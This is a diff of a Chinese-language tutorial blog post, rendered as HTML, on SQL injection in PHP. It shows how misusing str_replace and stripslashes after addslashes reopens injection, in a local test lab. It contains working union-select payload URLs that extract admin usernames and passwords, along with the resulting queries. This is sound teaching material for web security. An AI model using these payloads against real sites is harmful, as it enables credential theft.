@@ -174,13 +174,19 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>浏览器输入:</p>
-<pre><code>http://localhost/sqltest/streplace.php?id=1&#39;&amp;title=news title</code></pre><p>发现报错了，我们直接打印出执行的<code>sql</code>语句如下图：</p>
+<blockquote>
+<p><a href="http://localhost/sqltest/streplace.php?id=1&#39;&amp;title=news" target="_blank" rel="noopener">http://localhost/sqltest/streplace.php?id=1&#39;&amp;title=news</a> title</p>
+</blockquote>
+<p>发现报错了，我们直接打印出执行的<code>sql</code>语句如下图：</p>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18a23dafcj30hs02aq2t.jpg" alt></p>
 <p>发现参数<code>id</code>右边的单引号被反斜杠转义成字符了，说明又可以注入了。</p>
 <p>简单分析下上面<code>id</code>参数的执行过程，<code>-1&#39;</code>经过<code>addslashes</code>函数转义后变成了<code>-1\&#39;</code>，然后再经过<code>str_replace</code>函数干掉了单引号变成了<code>-1\</code>，最后带入查询的语句才是下面这样：</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1\'and title='</span>news title'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>反斜杠转义了<code>sql</code>查询语句里<code>id</code>后面那个单引号，导致<code>title</code>参数可以构造<code>sql</code>注入语句了，我们直接构造获取管理员账户密码的语句:</p>
-<pre><code>http://localhost/sqltest/streplace.php?id=-1&#39;&amp;title=union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p>实际执行的<code>SQL</code>语句:</p>
+<blockquote>
+<p><a href="http://localhost/sqltest/streplace.php?id=-1&#39;&amp;title=union" target="_blank" rel="noopener">http://localhost/sqltest/streplace.php?id=-1&#39;&amp;title=union</a> select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
+<p>实际执行的<code>SQL</code>语句:</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'-1\' and title='</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>pass<span class="token punctuation">)</span> <span class="token keyword">from</span> admin<span class="token comment" spellcheck="true">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18a2btwcpj30hs056jre.jpg" alt></p>
 <p>接下来我们再看下<code>stripslashes</code>函数，这个函数的定义是删除由<code>addslashes()</code>函数添加的反斜杠，所以很明显使用不当的话就会引发<code>SQL</code>注入。缺陷代码如下：</p>
@@ -213,7 +219,10 @@
 <p>浏览器输入<code>http://localhost/sqltest/stripslashes.php?id=-1&#39;</code>，发现报错了，<code>echo</code>出执行的<code>sql</code>语句如下图：</p>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18a2mzxbnj30hs02ja9x.jpg" alt></p>
 <p>分析下参数<code>id</code>的执行过程，<code>-1&#39;</code>经过<code>addslashes</code>函数转义后变成了<code>-1\&#39;</code>，然后再经过<code>stripslashes</code>函数干掉了反斜杠变成了<code>-1&#39;</code>，所以又可以愉快的注入了。<br>获取管理员账户密码的语句:</p>
-<pre><code>http://localhost/sqltest/stripslashes.php?id=-1&#39; union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18a2ud2ubj30hs05o74a.jpg" alt></p>
+<blockquote>
+<p><a href="http://localhost/sqltest/stripslashes.php?id=-1&#39;" target="_blank" rel="noopener">http://localhost/sqltest/stripslashes.php?id=-1&#39;</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
+<p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18a2ud2ubj30hs05o74a.jpg" alt></p>
 <p>实际执行的<code>SQL</code>语句:</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>pass<span class="token punctuation">)</span> <span class="token keyword">from</span> admin<span class="token comment" spellcheck="true">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="0x05-二次注入产生的原因"><a href="#0x05-二次注入产生的原因" class="headerlink" title="0x05 二次注入产生的原因"></a>0x05 二次注入产生的原因</h2><p>二次注入也是一种很常见的<code>sql</code>注入，它涉及到入库和出库。假如我们注册了一个网站，填写个人资料后保存时数据库里执行类似<code>insert into test values(1,&#39;braid&#39;,&#39;18&#39;,&#39;run&#39;)</code>这种<code>sql</code>语句，代表我向数据库表<code>test</code>里插入昵称为<code>braid</code>，年龄<code>18</code>岁，爱好是<code>run</code>的一个操作。接下来看下单引号在这条语句执行过程和<code>mysql</code>中的变化：</p>
